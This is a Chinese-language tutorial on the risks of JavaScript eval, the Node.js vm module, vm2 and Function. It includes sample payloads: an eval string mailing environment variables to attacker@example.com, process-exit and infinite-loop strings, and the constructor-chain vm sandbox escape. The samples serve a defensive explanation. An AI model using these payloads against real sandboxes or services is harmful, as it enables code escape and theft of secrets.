# eval 和 vm

> [原文](https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/)

## eval 的使用

eval() 函数会将传入的字符串当做 JS 代码执行，并返回代码的结果，如果是个表达式，则返回这个表达式的结果，没有返回结果时则返回 undefined。如果希望将一个字符串函数转换成函数的话，需要在首尾加上`()`以表示为一个表达式，比如`eval("(function name() {})")`，否则会返回 undefined。

## eval 的问题

如果 eval 执行的代码是动态的，这可能成为被黑客攻击的安全漏洞，看如下例子：

```js
// 让宿主程序陷入死循环
eval('while(true) console.log(1)');
// 让宿主程序意外退出
eval('process.exit(0)');
// 暴露了内部变量
eval(
  'require("node-mailer").mail("attacker@example.com", JSON.stringify(process.ENV))',
);
// 改写了eval本身，导致后面代码发生异常
eval('eval = undefined');
```

由于 eval 执行字符串代码时的上下文就是宿主程序的当前上下文，因此黑客可以借助 eval 调用宿主上下文中的变量。

## vm 的使用

NodeJS 的 vm 模块能够让一段代码在一个独立的 V8 容器中编译执行，不过性能会比 eval 差很多。

- vm.runInNewContext(code[, contextObject[, options]])

可以让代码执行在一个独立的上下文中，这可以避免动态代码部分访问宿主上下文的变量（其实不能完全避免）：

```js
const vm = require('vm');
let result = vm.runInNewContext('a + 1', { a: 2 });
console.log(result); // 3
vm.runInNewContext('console.log(a)', { a: 2 }); // ReferenceError: console is not defined
// 可以设置超时防止死循环
vm.runInNewContext('while(true) console.log(1)', {}, { timeout: 3 });
```

- vm.runInThisContext(code[, options])

这类似与 eval，动态代码的执行上下文会和当前执行环境绑定：

```js
a = 0;
vm.runInThisContext('a += 1');
console.log(a); // 1
```

## vm 的问题

vm 不能完全避免动态代码访问宿主上下文的变量，看如下例子：

```js
const ctx = {};
vm.runInNewContext(
  // 通过原型链访问了宿主上下文的成员
  "this.constructor.constructor('return process')().exit()",
  ctx,
);
```

我们可以进行这样修改：

```js
const ctx = Object.create(null);
vm.runInNewContext(
  // 无法访问，因为ctx没有继承原型
  "this.constructor.constructor('return process')().exit()",
  ctx,
);
```

但即使如此，依然会有安全隐患：

```js
const ctx = Object.create(null);
ctx.a = function() {};
vm.runInNewContext(
  // 借助自定义变量的原型链访问了宿主上下文的成员
  "this.a.constructor.constructor('return process')().exit()",
  ctx,
);
```

## 介绍 vm2

vm2 是社区为了解决 vm 的安全问题而产生的，它会在执行代码时进行安全检测，使用方式如下：

```js
const { VM } = require('vm2');
let vm = new VM({
  timeout: 10,
  sandbox: {
    a: function() {
      return 123;
    },
  },
});
vm.run('a()');
```

但由于 vm2 只是对代码进行了人为把控，说到底只是对已发现的安全隐患进行穷举并解决，但谁都不能保证未来不会出现新的安全隐患。

要从根本上解决动态执行代码带来的安全隐患的方案应该是让宿主程序与动态代码在物理层面进行分离，比如让动态代码在 VM、docker 容器、AWS 的 lambda 中执行。

## 使用 Function 替换 eval

- new Function ([arg1[, arg2[, ...argN]],] functionBody)

Function 构造函数可以创建一个新的 Function 对象。

- Function (functionBody)

直接调用可以动态创建函数，但会遇到和 eval 类似的的安全问题和（相对较小的）性能问题，与 eval 不同的是，Function 创建的函数只能在全局作用域中运行。

```js
// eval执行时会自下而上的查找上下文是否包含目标方法，因此性能远低于Function
function scene1() {
  function Date() {
    return { date: 'Monday' };
  }
  function parse(code) {
    return eval('(' + code + ')');
  }
  var result = parse('{a:(4-1), b:function() {}, c:new Date()}');
  // {a: 3, c: {…}, b: ƒ}
  console.log(result);
}
// Function中的代码是在顶级上下文中执行的
function scene2() {
  function Date() {
    return { date: 'Monday' };
  }
  function parse(code) {
    return Function('"use strict";return (' + code + ')')();
  }
  var result = parse('{a:(4-1), b:function() {}, c:new Date()}');
  // {a: 3, c: Thu Apr 02 2020 17:07:34 GMT+0800 (中国标准时间), b: ƒ}
  console.log(result);
}
// 变通是的Function调用局部方法
function scene3() {
  function Date() {
    return { date: 'Monday' };
  }
  function parse(code) {
    return Function('"use strict";return (' + code + ')')()(Date);
  }
  var result = parse('function(Date){ return new Date() }');
  // {date: "Monday"}
  console.log(result);
}
scene1();
scene2();
scene3();
```
